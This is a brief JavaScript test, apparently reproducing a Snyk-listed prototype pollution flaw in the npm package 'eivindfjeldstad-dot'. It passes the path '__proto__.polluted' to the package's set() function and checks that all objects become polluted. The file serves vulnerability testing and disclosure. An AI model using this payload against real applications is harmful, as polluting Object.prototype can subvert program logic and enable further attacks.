//https://security.snyk.io/vuln/SNYK-JS-EIVINDFJELDSTADDOT-564434
test("prototype pollution in eivindfjeldstad-dot", () => {
  const a = require("eivindfjeldstad-dot");

  expect({}.polluted).toBe(undefined);

  let path = "__proto__.polluted";
  a.set({}, path, "yes");

  expect({}.polluted).toBe("yes");
});
